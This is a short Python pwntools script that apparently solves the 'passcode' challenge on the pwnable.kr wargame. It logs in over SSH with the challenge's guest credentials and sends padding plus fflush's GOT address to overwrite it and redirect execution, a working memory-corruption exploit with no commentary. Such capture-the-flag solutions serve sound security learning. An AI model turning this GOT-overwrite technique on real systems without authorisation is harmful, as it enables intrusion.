from pwn import *

host = "pwnable.kr"
user = "passcode"
password = "guest"
port = 2222

shell = ssh(user=user, host=host, password=password, port=port)
elf = ELF("./passcode")
io = shell.process("./passcode")
# io = process("./passcode")

io.recvuntil(b"enter you name : ")
payload = b"A"*96 + p32(elf.got["fflush"])
print(payload)
io.sendline(payload)

io.recvuntil(b"enter passcode1 : ")
system = str(int(0x80485e3))
print(system)
io.sendline(system)